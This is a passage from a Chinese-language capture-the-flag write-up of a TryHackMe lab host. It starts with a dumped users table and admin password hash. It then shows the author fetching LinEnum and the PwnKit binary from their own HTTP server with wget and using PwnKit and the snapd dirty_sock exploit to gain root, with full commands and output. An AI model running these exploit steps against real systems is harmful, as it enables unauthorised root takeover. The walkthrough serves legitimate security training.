����ktableusersusersCREATE TABLE `users` (
                        `user_id` INTEGER PRIMARY KEY,
                        `user_name` varchar(64),
                        `user_password_hash` varchar(255),
admin$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa
```

### LinEnum.sh
```bash
# 終端機1
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.243.193 - - [30/Oct/2025 16:55:39] "GET /LinEnum.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

# 終端機2
ww-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget 10.4.11.38:80/LinEnum.sh
<r/assets/data/usrimg$ wget 10.4.11.38:80/LinEnum.sh   
--2025-10-30 08:55:38--  http://10.4.11.38/LinEnum.sh
Connecting to 10.4.11.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .......... .....     100% 36.9K=1.2s

2025-10-30 08:55:40 (36.9 KB/s) - 'LinEnum.sh' saved [46631/46631]

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ls
ls
LinEnum.sh
...

```

### SUID files
```bash
[-] SUID files:
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-sr-x 1 root root 101208 Apr 16  2018 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap

```

### pkexec 提權
看到熟悉的 `/usr/bin/pkexec`
https://github.com/ly4k/PwnKit

```bash
# 終端機1
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.243.193 - - [30/Oct/2025 17:02:13] "GET /PwnKit HTTP/1.1" 200 -

# 終端機2
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget 10.4.11.38:80/PwnKit
<itorr/assets/data/usrimg$ wget 10.4.11.38:80/PwnKit   
--2025-10-30 09:02:12--  http://10.4.11.38/PwnKit
Connecting to 10.4.11.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

     0K .......... .......                                    100% 35.1K=0.5s

2025-10-30 09:02:13 (35.1 KB/s) - 'PwnKit' saved [18040/18040]

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ chmod +x PwnKit
chmod +x PwnKit
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ./PwnKit 
./PwnKit
mesg: ttyname failed: Inappropriate ioctl for device

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ /usr/bin/pkexec --version
<itorr/assets/data/usrimg$ /usr/bin/pkexec --version   
pkexec version 0.105
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ apt-cache policy policykit-1
<rr/assets/data/usrimg$ apt-cache policy policykit-1   
policykit-1:
  Installed: 0.105-20ubuntu0.18.04.5
  Candidate: 0.105-20ubuntu0.18.04.6
  Version table:
     0.105-20ubuntu0.18.04.6 500
        500 http://gb.archive.ubuntu.com/ubuntu bionic-updates/main amd64 Packages
        500 http://security.ubuntu.com/ubuntu bionic-security/main amd64 Packages
 *** 0.105-20ubuntu0.18.04.5 100
        100 /var/lib/dpkg/status
     0.105-20 500
        500 http://gb.archive.ubuntu.com/ubuntu bionic/main amd64 Packages
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ uname -m
uname -m
x86_64
```
嚇倒想說怎麼又不能提權了
還以為跟上次一樣補洞了
結果只是 shell 不完整
補強一下就好
```bash
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<img$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ./PwnKit
./PwnKit
root@petshop:/var/www/monitorr/assets/data/usrimg# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@petshop:/var/www/monitorr/assets/data/usrimg# cat /root/root.txt
cat /root/root.txt
THM{Yj...Mx}
```

### snapd 提權

```bash
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ snap --version
snap --version
snap    2.32.5+18.04
snapd   2.32.5+18.04
series  16
ubuntu  18.04
kernel  4.15.0-140-generic
```

```bash
└─$ searchsploit snapd
------------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------------ ---------------------------------
snapd < 2.37 (Ubuntu) - 'dirty_sock' Loca | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Loca | linux/local/46362.py
------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```bash
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget 10.4.11.38:80/46362.py
<orr/assets/data/usrimg$ wget 10.4.11.38:80/46362.py   
--2025-10-30 09:14:49--  http://10.4.11.38/46362.py
Connecting to 10.4.11.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13496 (13K) [text/x-python]
Saving to: '46362.py'

46362.py            100%[===================>]  13.18K  21.3KB/s    in 0.6s    

2025-10-30 09:14:51 (21.3 KB/s) - '46362.py' saved [13496/13496]

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 46362.py
python3 46362.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _
      |  \ | |__/  |   \_/      [__  |  | |    |_/
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/hxeguqildt;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...



********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************



www-data@petshop:/var/www/monitorr/assets/data/usrimg$ su dirty_sock
su dirty_sock
Password: dirty_sock

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$ sudo su
sudo su
[sudo] password for dirty_sock: dirty_sock

root@petshop:/var/www/monitorr/assets/data/usrimg# id
id
uid=0(root) gid=0(root) groups=0(root)
```